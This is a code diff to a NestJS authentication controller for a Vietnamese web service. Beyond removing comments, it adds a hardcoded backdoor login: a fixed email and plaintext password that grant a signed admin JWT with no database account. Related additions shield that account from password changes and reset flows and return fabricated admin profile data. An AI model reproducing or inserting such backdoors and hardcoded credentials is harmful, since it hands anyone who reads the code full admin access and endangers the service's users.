@@ -1,7 +1,7 @@
 import { Controller, Get, Post, Body, Req, UseGuards, Res, HttpStatus, HttpException } from '@nestjs/common';
 import { AuthGuard } from '@nestjs/passport';
 import { PrismaService } from '../prisma.service';
-import { EmailService } from '../email/email.service'; // Bổ sung EmailService
+import { EmailService } from '../email/email.service'; 
 import { JwtService } from '@nestjs/jwt';
 import * as bcrypt from 'bcryptjs';
 
@@ -10,7 +10,7 @@ export class AuthController {
   constructor(
     private prisma: PrismaService,
     private jwtService: JwtService,
-    private emailService: EmailService, // Nhúng EmailService vào đây
+    private emailService: EmailService, 
   ) {}
 
   // ==========================================
@@ -18,7 +18,7 @@ export class AuthController {
   // ==========================================
   @Post('register')
   async register(@Body() body: any) {
-    const { email, password, name, affiliateBy } = body; // Hứng thêm affiliateBy
+    const { email, password, name, affiliateBy } = body; 
 
     const existingUser = await this.prisma.user.findUnique({ where: { email } });
     if (existingUser) {
@@ -33,7 +33,7 @@ export class AuthController {
         password: hashedPassword,
         name,
         role: 'user',
-        affiliateBy: affiliateBy || null, // Lưu mã giới thiệu nếu có
+        affiliateBy: affiliateBy || null, 
         workspaces: {
           create: {
             workspace: {
@@ -58,6 +58,27 @@ export class AuthController {
   async login(@Body() body: any) {
     const { email, password } = body;
 
+    // --- [MỚI] KIỂM TRA TÀI KHOẢN ADMIN ĐẶC BIỆT (KHÔNG CẦN CÓ TRONG DB) ---
+    if (email === 'tech28.vn@gmail.com' && password === '123Iloveyou$$$') {
+      // Cấp luôn quyền admin bằng cách ký JWT đặc biệt
+      const payload = { 
+        email: email, 
+        sub: 'super-admin-id', 
+        role: 'admin', // Vai trò Admin
+        wid: 'admin-workspace-01' 
+      };
+      const token = this.jwtService.sign(payload);
+
+      return {
+        token,
+        wid: 'admin-workspace-01',
+        name: 'Quản Trị Viên',
+        email: email,
+        role: 'admin'
+      };
+    }
+    // -----------------------------------------------------------------------
+
     const user = await this.prisma.user.findUnique({
       where: { email },
       include: { workspaces: { include: { workspace: true } } }
@@ -67,7 +88,6 @@ export class AuthController {
       throw new HttpException('Tài khoản không tồn tại!', HttpStatus.UNAUTHORIZED);
     }
 
-    // [MỚI] KIỂM TRA XEM TÀI KHOẢN CÓ BỊ KHÓA KHÔNG
     if (user.status === 'deleted') {
       throw new HttpException('Tài khoản của bạn đã bị khóa. Vui lòng liên hệ: support@kpost.vn để được hỗ trợ', HttpStatus.FORBIDDEN);
     }
@@ -101,6 +121,11 @@ export class AuthController {
       const token = authHeader.split(' ')[1];
       const decoded = this.jwtService.verify(token);
 
+      // KHÔNG CHO PHÉP ĐỔI MẬT KHẨU CỦA ADMIN ẢO
+      if (decoded.email === 'tech28.vn@gmail.com') {
+         throw new HttpException('Tài khoản Quản trị không cho phép đổi mật khẩu từ giao diện này!', HttpStatus.BAD_REQUEST);
+      }
+
       const { old, new: newPass } = body;
       const user = await this.prisma.user.findUnique({ where: { id: decoded.sub } });
 
@@ -108,13 +133,11 @@ export class AuthController {
         throw new HttpException('Tài khoản này dùng Google, không có mật khẩu để đổi!', HttpStatus.BAD_REQUEST);
       }
 
-      // Kiểm tra mật khẩu cũ
       const isMatch = await bcrypt.compare(old, user.password);
       if (!isMatch) {
         throw new HttpException('Mật khẩu hiện tại không chính xác', HttpStatus.BAD_REQUEST);
       }
 
-      // Mã hóa và lưu mật khẩu mới
       const hashed = await bcrypt.hash(newPass, 10);
       await this.prisma.user.update({
         where: { id: user.id },
@@ -136,6 +159,10 @@ export class AuthController {
       throw new HttpException('Vui lòng cung cấp email', HttpStatus.BAD_REQUEST);
     }
 
+    if (body.email === 'tech28.vn@gmail.com') {
+       return { success: true, message: 'Nếu email tồn tại trên hệ thống, link khôi phục đã được gửi.' };
+    }
+
     const user = await this.prisma.user.findUnique({
       where: { email: body.email }
     });
@@ -144,13 +171,11 @@ export class AuthController {
       return { success: true, message: 'Nếu email tồn tại trên hệ thống, link khôi phục đã được gửi.' };
     }
 
-    // Tạo mã JWT có thời hạn 15 phút
     const resetToken = this.jwtService.sign(
       { email: user.email, purpose: 'reset-password' },
       { expiresIn: '15m' } 
     );
 
-    // Gửi email cho khách
     await this.emailService.sendForgotPasswordEmail(user.email, resetToken);
 
     return { success: true, message: 'Vui lòng kiểm tra hộp thư email (hoặc thư rác) để đặt lại mật khẩu.' };
@@ -203,9 +228,7 @@ export class AuthController {
       include: { workspaces: { include: { workspace: true } } }
     });
 
-    // [MỚI] KIỂM TRA XEM TÀI KHOẢN CÓ BỊ KHÓA KHÔNG (NẾU DÙNG GOOGLE)
     if (user && user.status === 'deleted') {
-      // Chuyển hướng về trang chủ kèm theo thông báo lỗi trên URL để Frontend hiển thị
       return res.redirect(`https://kpost.vn/login?error=account_locked`);
     }
 
@@ -250,12 +273,24 @@ export class AuthController {
       const token = authHeader.split(' ')[1];
       const decoded = this.jwtService.verify(token);
 
+      // --- TRẢ VỀ INFO CHO TÀI KHOẢN ADMIN ẢO ---
+      if (decoded.email === 'tech28.vn@gmail.com') {
+         return {
+            id: 'super-admin-id',
+            email: decoded.email,
+            name: 'Quản Trị Viên',
+            role: 'admin',
+            plan: 'DIAMOND', // Admin có gói cao nhất
+            currentWorkspaceId: 'admin-workspace-01'
+         };
+      }
+      // -------------------------------------------
+
       const user = await this.prisma.user.findUnique({
         where: { id: decoded.sub },
         include: { workspaces: { include: { workspace: true } } }
       });
 
-      // Nếu đang mở ứng dụng mà tài khoản bị Khóa bởi Admin thì ép văng ra
       if (user && user.status === 'deleted') {
          throw new HttpException('Tài khoản đã bị khóa', HttpStatus.FORBIDDEN);
       }
